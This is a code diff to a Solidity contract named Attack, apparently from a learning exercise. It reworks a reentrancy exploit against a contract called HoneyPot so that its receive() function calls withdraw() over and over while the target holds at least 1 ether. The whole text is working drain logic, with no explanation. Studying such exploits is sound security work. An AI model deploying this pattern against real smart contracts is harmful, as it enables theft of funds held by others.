@@ -10,20 +10,18 @@ contract Attack {
         honeyPot = HoneyPot(_depositFundsAddress);
     }
 
-    // Fallback is called when DepositFunds sends Ether to this contract.
-    fallback() external payable {
-        if (address(honeyPot).balance >= 1 ether) {
-            honeyPot.withdraw();
-        }
-    }
-
     function attack() external payable {
-        require(msg.value >= 1 ether);
-        honeyPot.deposit{value: 1 ether}();
         honeyPot.withdraw();
     }
 
+    function deposit() external payable {
+        require(msg.value >= 10 ether);
+        honeyPot.deposit{value: 10 ether}();
+    }
+
     receive() external payable  { 
-        
+        if (address(honeyPot).balance >= 1 ether) {
+            honeyPot.withdraw();
+        }
     }
 }
